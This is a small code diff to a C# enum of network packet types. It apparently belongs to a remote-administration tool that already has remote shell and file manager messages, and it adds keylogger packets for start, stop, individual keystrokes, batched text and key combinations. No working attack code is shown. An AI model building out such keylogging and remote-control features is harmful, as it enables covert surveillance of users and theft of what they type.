@@ -10,7 +10,15 @@ namespace Common.Enums
         RemoteShellRequest = 12,
         RemoteShellResponse = 13,
         FileManagerRequest = 14,
-        FileManagerResponse = 15
+        FileManagerResponse = 15,
+
+        // KeyLogger packets
+        KeyLoggerStart = 100,
+        KeyLoggerStop = 101,
+        KeyLoggerEvent = 102, // single key event (parallel)
+        KeyLoggerBatch = 103, // batch text (continuous)
+        KeyLoggerComboEvent = 104, // detected key combination event
+        KeyLoggerLangToggle = 105
 
     }
 }
